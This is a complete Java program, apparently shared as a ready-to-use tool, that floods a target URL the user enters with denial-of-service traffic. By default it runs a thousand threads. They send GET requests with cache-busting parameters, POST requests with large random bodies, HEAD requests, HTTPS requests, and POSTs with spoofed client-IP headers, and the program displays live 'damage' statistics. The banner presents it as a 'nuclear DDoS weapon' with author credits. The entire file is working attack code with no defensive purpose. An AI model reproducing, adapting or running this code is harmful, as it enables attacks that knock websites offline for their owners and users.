import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;
import javax.net.ssl.*;

public class UniversalDDoS {
    
    private static final String[] COLORS = {
        "\u001B[38;5;196m", "\u001B[38;5;46m", "\u001B[38;5;51m", 
        "\u001B[38;5;93m", "\u001B[38;5;226m", "\u001B[38;5;201m",
        "\u001B[38;5;208m", "\u001B[38;5;120m"
    };
    private static final String RESET = "\u001B[0m";
    private static int colorIndex = 0;
    
    private static int THREAD_COUNT = 1000;
    private static String TARGET_URL = "";
    private static final AtomicLong TOTAL_REQUESTS = new AtomicLong(0);
    private static final AtomicLong SUCCESS_COUNT = new AtomicLong(0);
    private static final AtomicLong ERROR_COUNT = new AtomicLong(0);
    private static final AtomicLong BANDWIDTH_USED = new AtomicLong(0);
    private static long START_TIME = System.currentTimeMillis();
    private static volatile boolean IS_RUNNING = true;
    private static ExecutorService EXECUTOR;
    
    private static final String OS = System.getProperty("os.name").toLowerCase();
    private static final boolean IS_WINDOWS = OS.contains("win");
    private static final boolean IS_MAC = OS.contains("mac");
    private static final boolean IS_LINUX = OS.contains("linux");
    private static final boolean IS_TERMUX = System.getProperty("user.home").contains("com.termux");
    
    private static final String[] USER_AGENTS = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    };
    
    private static String getColor() {
        return COLORS[colorIndex];
    }
    
    private static void rotateColor() {
        colorIndex = (colorIndex + 1) % COLORS.length;
    }
    
    private static String getRandomUserAgent() {
        Random random = new Random();
        return USER_AGENTS[random.nextInt(USER_AGENTS.length)];
    }
    
    private static String generateRandomIP() {
        Random random = new Random();
        return random.nextInt(256) + "." + random.nextInt(256) + "." + 
               random.nextInt(256) + "." + random.nextInt(256);
    }
    
    static class UniversalAttackWorker implements Runnable {
        private int workerId;
        private Random random = new Random();
        
        public UniversalAttackWorker(int id) {
            this.workerId = id;
        }
        
        @Override
        public void run() {
            while (IS_RUNNING) {
                try {
                    int requestsPerCycle = getPlatformRequests();
                    for (int i = 0; i < requestsPerCycle && IS_RUNNING; i++) {
                        boolean success = executeAdvancedAttack();
                        TOTAL_REQUESTS.incrementAndGet();
                        if (success) {
                            SUCCESS_COUNT.incrementAndGet();
                        } else {
                            ERROR_COUNT.incrementAndGet();
                        }
                    }
                    Thread.sleep(getPlatformDelay());
                } catch (Exception e) {
                    ERROR_COUNT.incrementAndGet();
                }
            }
        }
        
        private int getPlatformRequests() {
            if (IS_TERMUX) return 5;
            if (IS_WINDOWS) return 15;
            return 10;
        }
        
        private int getPlatformDelay() {
            if (IS_TERMUX) return 20;
            return 5;
        }
        
        private boolean executeAdvancedAttack() {
            try {
                int attackType = random.nextInt(5);
                switch (attackType) {
                    case 0: return advancedGetAttack();
                    case 1: return advancedPostAttack();
                    case 2: return advancedHeadAttack();
                    case 3: return sslConnectionAttack();
                    case 4: return spoofedRequestAttack();
                    default: return advancedGetAttack();
                }
            } catch (Exception e) {
                return false;
            }
        }
        
        private boolean advancedGetAttack() {
            try {
                String urlWithParams = TARGET_URL + "?cache=" + System.nanoTime() + 
                                     "&rnd=" + Math.random() + "&thread=" + workerId +
                                     "&platform=" + getPlatformName();
                URL obj = new URL(urlWithParams);
                HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                con.setRequestMethod("GET");
                con.setRequestProperty("User-Agent", getRandomUserAgent());
                con.setRequestProperty("Accept", "*/*");
                con.setRequestProperty("Cache-Control", "no-cache");
                con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
                con.setConnectTimeout(2000);
                con.setReadTimeout(2000);
                con.getResponseCode();
                return true;
            } catch (Exception e) {
                return false;
            }
        }
        
        private boolean advancedPostAttack() {
            try {
                URL obj = new URL(TARGET_URL);
                HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("User-Agent", getRandomUserAgent());
                con.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                con.setRequestProperty("Accept", "*/*");
                con.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
                con.setConnectTimeout(2000);
                con.setReadTimeout(2000);
                
                String postData = generateAdvancedPostData();
                byte[] postDataBytes = postData.getBytes("UTF-8");
                BANDWIDTH_USED.addAndGet(postDataBytes.length);
                
                con.setDoOutput(true);
                DataOutputStream wr = new DataOutputStream(con.getOutputStream());
                wr.write(postDataBytes);
                wr.flush();
                wr.close();
                
                con.getResponseCode();
                return true;
            } catch (Exception e) {
                return false;
            }
        }
        
        private boolean advancedHeadAttack() {
            try {
                URL obj = new URL(TARGET_URL);
                HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                con.setRequestMethod("HEAD");
                con.setRequestProperty("User-Agent", getRandomUserAgent());
                con.setConnectTimeout(2000);
                con.setReadTimeout(2000);
                con.getResponseCode();
                return true;
            } catch (Exception e) {
                return false;
            }
        }
        
        private boolean sslConnectionAttack() {
            try {
                if (TARGET_URL.startsWith("https")) {
                    URL obj = new URL(TARGET_URL);
                    HttpsURLConnection con = (HttpsURLConnection) obj.openConnection();
                    con.setRequestMethod("GET");
                    con.setRequestProperty("User-Agent", getRandomUserAgent());
                    con.setConnectTimeout(2000);
                    con.setReadTimeout(2000);
                    con.getResponseCode();
                    return true;
                } else {
                    return advancedGetAttack();
                }
            } catch (Exception e) {
                return false;
            }
        }
        
        private boolean spoofedRequestAttack() {
            try {
                URL obj = new URL(TARGET_URL);
                HttpURLConnection con = (HttpURLConnection) obj.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("User-Agent", getRandomUserAgent());
                con.setRequestProperty("X-Forwarded-For", generateRandomIP());
                con.setRequestProperty("X-Real-IP", generateRandomIP());
                con.setRequestProperty("X-Client-IP", generateRandomIP());
                con.setRequestProperty("Content-Type", "application/json");
                con.setConnectTimeout(2000);
                con.setReadTimeout(2000);
                
                String jsonData = "{\"attack\":\"nuclear\",\"timestamp\":" + System.currentTimeMillis() + "}";
                con.setDoOutput(true);
                DataOutputStream wr = new DataOutputStream(con.getOutputStream());
                wr.writeBytes(jsonData);
                wr.flush();
                wr.close();
                
                con.getResponseCode();
                return true;
            } catch (Exception e) {
                return false;
            }
        }
        
        private String generateAdvancedPostData() {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < 200; i++) {
                sb.append("universal_param_").append(i).append("_").append(workerId).append("=");
                for (int j = 0; j < 50; j++) {
                    sb.append((char) ('a' + random.nextInt(26)));
                }
                sb.append("&");
            }
            return sb.toString();
        }
        
        private String getPlatformName() {
            if (IS_WINDOWS) return "windows";
            if (IS_MAC) return "macos";
            if (IS_LINUX) return "linux";
            if (IS_TERMUX) return "termux";
            return "unknown";
        }
    }
    
    private static void showStats() {
        long currentTime = System.currentTimeMillis();
        long elapsedSeconds = (currentTime - START_TIME) / 1000;
        if (elapsedSeconds == 0) elapsedSeconds = 1;
        
        long totalRequests = TOTAL_REQUESTS.get();
        long requestsPerSecond = totalRequests / elapsedSeconds;
        long requestsPerMinute = requestsPerSecond * 60;
        long bandwidthMB = BANDWIDTH_USED.get() / (1024 * 1024);
        
        double successRate = totalRequests > 0 ? (SUCCESS_COUNT.get() * 100.0 / totalRequests) : 0;
        
        String color = getColor();
        System.out.println(color + "╔══════════════════════════════════════════════════════════════════════╗" + RESET);
        System.out.println(color + "║                    UNIVERSAL DDOS STATS v5.0                       ║" + RESET);
        System.out.println(color + "╠══════════════════════════════════════════════════════════════════════╣" + RESET);
        System.out.println(color + "║ Platform:       " + String.format("%-40s", getPlatformDisplay()) + "║" + RESET);
        System.out.println(color + "║ Total Requests: " + String.format("%,-40d", totalRequests) + "║" + RESET);
        System.out.println(color + "║ Successful:     " + String.format("%,-40d", SUCCESS_COUNT.get()) + "║" + RESET);
        System.out.println(color + "║ Errors:         " + String.format("%,-40d", ERROR_COUNT.get()) + "║" + RESET);
        System.out.println(color + "║ Success Rate:   " + String.format("%-40.2f%%", successRate) + "║" + RESET);
        System.out.println(color + "║ Requests/Sec:   " + String.format("%,-40d", requestsPerSecond) + "║" + RESET);
        System.out.println(color + "║ Est. Per Min:   " + String.format("%,-40d", requestsPerMinute) + "║" + RESET);
        System.out.println(color + "║ Bandwidth Used: " + String.format("%,-40d MB", bandwidthMB) + "║" + RESET);
        System.out.println(color + "║ Active Threads: " + String.format("%,-40d", THREAD_COUNT) + "║" + RESET);
        System.out.println(color + "║ Running Time:   " + String.format("%-40d s", elapsedSeconds) + "║" + RESET);
        System.out.println(color + "╚══════════════════════════════════════════════════════════════════════╝" + RESET);
        
        if (requestsPerSecond > 10000) {
            System.out.println(color + "💀 APOCALYPSE: Target is completely destroyed!" + RESET);
        } else if (requestsPerSecond > 5000) {
            System.out.println(color + "🔥 NUCLEAR: Server resources are vaporizing!" + RESET);
        } else if (requestsPerSecond > 2000) {
            System.out.println(color + "⚡ ULTRA: Server is melting down!" + RESET);
        } else if (requestsPerSecond > 1000) {
            System.out.println(color + "🚀 HIGH: Server is under heavy load!" + RESET);
        } else {
            System.out.println(color + "⚡ MEDIUM: Attack is running smoothly!" + RESET);
        }
        System.out.println();
    }
    
    private static String getPlatformDisplay() {
        if (IS_WINDOWS) return "Windows 🪟";
        if (IS_MAC) return "macOS 🍎";
        if (IS_LINUX) return "Linux 🐧";
        if (IS_TERMUX) return "Termux/Android 📱";
        return "Unknown Platform";
    }
    
    private static void clearConsole() {
        try {
            if (IS_WINDOWS) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[2J");
                System.out.flush();
            }
        } catch (Exception e) {
            for (int i = 0; i < 50; i++) {
                System.out.println();
            }
        }
    }
    
    private static void displayBanner() {
        String color = getColor();
        System.out.println(color + "8888888b.       888                               d8888 888                                  888       .d8888b.           888                            " + RESET);
        System.out.println(color + "888  \"Y88b      888                              d88888 888                                  888      d88P  Y88b          888                            " + RESET);
        System.out.println(color + "888    888      888                             d88P888 888                                  888      888    888          888                            " + RESET);
        System.out.println(color + "888    888  .d88888  .d88b.  .d8888b           d88P 888 88888b.  88888b.d88b.   8888b.   .d88888      888        888  888 88888b.   .d88b.  888d888      " + RESET);
        System.out.println(color + "888    888 d88\" 888 d88\"\"88b 88K              d88P  888 888 \"88b 888 \"888 \"88b     \"88b d88\" 888      888        888  888 888 \"88b d8P  Y8b 888P\"        " + RESET);
        System.out.println(color + "888    888 888  888 888  888 \"Y8888b.        d88P   888 888  888 888  888  888 .d888888 888  888      888    888 888  888 888  888 88888888 888          " + RESET);
        System.out.println(color + "888  .d88P Y88b 888 Y88..88P      X88       d8888888888 888  888 888  888  888 888  888 Y88b 888      Y88b  d88P Y88b 888 888 d88P Y8b.     888          " + RESET);
        System.out.println(color + "8888888P\"   \"Y88888  \"Y88P\"   88888P'      d88P     888 888  888 888  888  888 \"Y888888  \"Y88888       \"Y8888P\"   \"Y88888 88888P\"   \"Y8888  888          " + RESET);
        System.out.println(color + "                                                                                                                      888                                 " + RESET);
        System.out.println(color + "                                                                                                                 Y8b d88P                                 " + RESET);
        System.out.println(color + "                                                                                                                  \"Y88P\"                                  " + RESET);
        System.out.println();
        System.out.println(color + "🚀 UNIVERSAL NUCLEAR DDOS WEAPON v5.0" + RESET);
        System.out.println(color + "⚡ Cross-Platform: Windows • Linux • macOS • Termux • Android" + RESET);
        System.out.println(color + "👑 Created by: Ahmad Cyber Prince" + RESET);
        System.out.println(color + "📱 Instagram: @Cyber_ir_Ahmad" + RESET);
        System.out.println(color + "🔗 GitHub: https://github.com/Ahmad-Cyber-prince" + RESET);
        System.out.println(color + "📱 Platform: " + getPlatformDisplay() + RESET);
        System.out.println(color + "==============================================" + RESET);
        System.out.println();
    }
    
    public static void main(String[] args) throws Exception {
        if (IS_TERMUX) {
            THREAD_COUNT = 500;
        }
        
        displayBanner();
        
        Scanner scanner = new Scanner(System.in);
        
        System.out.print(getColor() + "🎯 Enter Target URL: " + RESET);
        TARGET_URL = scanner.nextLine();
        
        if (!TARGET_URL.startsWith("http")) {
            TARGET_URL = "http://" + TARGET_URL;
        }
        
        System.out.println();
        System.out.println(getColor() + "🎯 Target: " + TARGET_URL + RESET);
        
        System.out.println(getColor() + "⚡ Configuring Universal Attack..." + RESET);
        
        System.out.print(getColor() + "🔢 Thread Count (recommended ");
        if (IS_TERMUX) {
            System.out.print("200-1000");
        } else {
            System.out.print("1000-5000");
        }
        System.out.print("): " + RESET);
        
        String threadInput = scanner.nextLine();
        if (!threadInput.isEmpty()) {
            THREAD_COUNT = Integer.parseInt(threadInput);
        }
        
        System.out.println();
        System.out.println(getColor() + "⚠️  UNIVERSAL WEAPON ACTIVATED ON " + getPlatformDisplay().toUpperCase() + "!" + RESET);
        System.out.println(getColor() + "🚀 Starting attack in 3 seconds..." + RESET);
        
        for (int i = 3; i > 0; i--) {
            System.out.println(getColor() + "💀 " + i + "..." + RESET);
            Thread.sleep(1000);
        }
        
        EXECUTOR = Executors.newFixedThreadPool(THREAD_COUNT);
        
        for (int i = 0; i < THREAD_COUNT; i++) {
            EXECUTOR.execute(new UniversalAttackWorker(i));
        }
        
        System.out.println(getColor() + "💀 UNIVERSAL DDOS ATTACK STARTED! 💀" + RESET);
        System.out.println(getColor() + "🎯 Target: " + TARGET_URL + RESET);
        System.out.println(getColor() + "🔢 Threads: " + THREAD_COUNT + RESET);
        System.out.println(getColor() + "🖥️  Platform: " + getPlatformDisplay() + RESET);
        System.out.println(getColor() + "👑 Created by: Ahmad Cyber Prince" + RESET);
        System.out.println(getColor() + "📱 Instagram: @Cyber_ir_Ahmad" + RESET);
        System.out.println();
        
        Thread colorThread = new Thread(() -> {
            try {
                while (IS_RUNNING) {
                    Thread.sleep(5000);
                    rotateColor();
                    clearConsole();
                    displayBanner();
                    showStats();
                }
            } catch (InterruptedException e) {
            }
        });
        colorThread.setDaemon(true);
        colorThread.start();
        
        Thread statsThread = new Thread(() -> {
            while (IS_RUNNING) {
                try {
                    Thread.sleep(3000);
                    showStats();
                    System.out.println(getColor() + "⏹️  Press Ctrl+C to stop the universal attack" + RESET);
                } catch (InterruptedException e) {
                    break;
                }
            }
        });
        statsThread.setDaemon(true);
        statsThread.start();
        
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            IS_RUNNING = false;
            if (EXECUTOR != null) {
                EXECUTOR.shutdownNow();
            }
            System.out.println();
            System.out.println(getColor() + "🛑 UNIVERSAL ATTACK TERMINATED!" + RESET);
            System.out.println(getColor() + "💀 FINAL DAMAGE REPORT:" + RESET);
            showStats();
        }));
        
        try {
            while (true) {
                Thread.sleep(1000);
            }
        } catch (InterruptedException e) {
            IS_RUNNING = false;
            EXECUTOR.shutdownNow();
        }
    }
}
